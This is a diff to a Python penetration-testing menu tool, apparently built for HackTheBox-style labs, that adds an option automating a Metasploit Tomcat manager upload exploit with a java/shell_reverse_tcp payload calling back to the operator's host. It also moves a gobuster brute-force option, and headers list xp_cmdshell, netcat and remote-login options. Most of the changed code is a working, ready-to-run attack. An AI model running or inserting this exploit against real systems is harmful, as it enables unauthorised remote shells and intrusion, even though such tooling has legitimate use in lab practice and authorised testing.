@@ -2398,7 +2398,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2439,25 +2439,38 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - HTTP GoBuster with common.txt
+# Version : JERRY
+# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='70':
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
+      command("touch meterpreter.rc")
+      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
+      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
+      if "8080" in POR:
+         command("echo 'set RPORT 8080' >> meterpreter.rc")
       else:
-         if WEB[:5] != "EMPTY":
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
-         else:
-            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
-      prompt()
+         PORT = input("Please enter tomcat port number: ")
+         command("echo 'set RPORT " + PORT + "' >> meterpreter.rc")
+      command("echo 'set HttpPassword " + PAS.rstrip(" ") + "' >> meterpreter.rc")
+      command("echo 'set HttpUsername " + USR.rstrip(" ") + "' >> meterpreter.rc")
+      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
+      command("hostname -I >> temp.tmp")
+      target = linecache.getline("temp.tmp",1)
+      os.remove("temp.tmp")
+      one, two, three, four = target.split(" ")
+      target = two.rstrip(" ")
+      command("echo 'set lhost " + target + "' >> meterpreter.rc")
+      command("echo 'run' >> meterpreter.rc")
+      command("msfconsole -r meterpreter.rc")
+      prompt() 
+      os.remove("meterpreter.rc")      
       
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit (1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2468,7 +2481,7 @@ while True:
  #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2479,7 +2492,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2490,7 +2503,7 @@ while True:
  #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2501,18 +2514,25 @@ while True:
  #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
-# Details : Menu option selected - Exit(1)
+# Version : JERRY
+# Details : Menu option selected - GOBUSTER 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='75':
-      exit(1)          
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+      else:
+         if WEB[:5] != "EMPTY":
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
+         else:
+            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/wordlists/dirb/common.txt -t 50")
+      prompt()
       
  #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - FTP IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2525,7 +2545,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - TFPS IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2538,7 +2558,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - SFTP IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2551,7 +2571,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - PFTP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2564,7 +2584,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected -  sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2577,7 +2597,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ssh -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2590,7 +2610,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - ssh -i id USER@IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2603,7 +2623,7 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Exit(1)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2617,7 +2637,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - telnet -l USER IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2630,7 +2650,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - nc IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2643,7 +2663,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Windows remote login on POR 5985.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2673,7 +2693,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2686,7 +2706,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Xfreeredp
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2699,7 +2719,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Fuse
+# Version : JERRY
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
